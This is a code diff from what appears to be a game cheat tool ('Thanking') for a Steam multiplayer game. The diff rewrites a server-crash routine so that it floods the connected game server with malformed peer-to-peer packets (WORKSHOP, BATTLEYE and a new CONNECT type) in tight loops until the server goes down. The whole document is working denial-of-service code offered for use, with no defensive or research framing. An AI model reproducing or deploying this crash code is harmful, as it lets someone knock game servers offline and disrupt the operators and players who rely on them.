@@ -28,8 +28,9 @@ namespace Thanking.Threads
                 OV_Provider.IsConnected = false;
             };
 
-            byte[] P1 = { (byte) ESteamPacket.WORKSHOP, 0, 0 };
-            byte[] P2 = { (byte) ESteamPacket.BATTLEYE, 0, 0 };
+            byte[] P1 = { (byte) ESteamPacket.WORKSHOP, 0 };
+            byte[] P2 = { (byte) ESteamPacket.BATTLEYE, 0 };
+            byte[] P3 = { (byte) ESteamPacket.CONNECT, 0 };
             
             while (true)
             {
@@ -38,10 +39,21 @@ namespace Thanking.Threads
                     switch (MiscOptions.SCrashMethod)
                     {
                         case 1:
-                            SteamNetworking.SendP2PPacket(Provider.server, P1, 3, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
+                            while (OV_Provider.IsConnected && (ServerCrashEnabled || AlwaysCrash))
+                                SteamNetworking.SendP2PPacket(Provider.server, P1, 2, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
+                            
                             break;
+                        
                         case 2:
-                            SteamNetworking.SendP2PPacket(Provider.server, P2, 3, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
+                            while (OV_Provider.IsConnected && (ServerCrashEnabled || AlwaysCrash))
+                                SteamNetworking.SendP2PPacket(Provider.server, P2, 2, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
+                            
+                            break;
+                        
+                        case 3:
+                            while (OV_Provider.IsConnected && (ServerCrashEnabled || AlwaysCrash))
+                                SteamNetworking.SendP2PPacket(Provider.server, P3, 2, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
+                            
                             break;
                     }
                 }
